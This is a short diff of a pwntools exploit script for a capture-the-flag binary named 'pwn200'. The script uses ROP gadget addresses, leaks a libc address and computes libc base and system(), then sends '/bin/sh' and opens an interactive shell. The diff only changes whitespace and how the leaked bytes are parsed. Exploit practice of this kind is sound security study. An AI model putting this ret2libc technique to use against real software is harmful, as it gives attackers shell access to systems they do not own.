@@ -1,8 +1,10 @@
 from pwn import *
+
 target = "./pwn200"
 
 p    = process(target)
 e    = ELF(target)
+
 pppr = 0x08048599
 pr   = pppr + 2
 bss  = 0x0804a000
@@ -29,7 +31,7 @@ payload += p32(bss)
 
 p.sendline(payload)
 
-recv = p.recv().split("\n")[0]
+recv = p.recv().split("\n")[-2][:4]
 libc_base = u32(recv) - 0x18540
 system = libc_base + 0x3a940
 
@@ -38,6 +40,5 @@ log.info("system    : {}".format(hex(system)))
 
 p.send("/bin/sh\x00")
 p.send(p32(system))
-
 p.interactive()
 
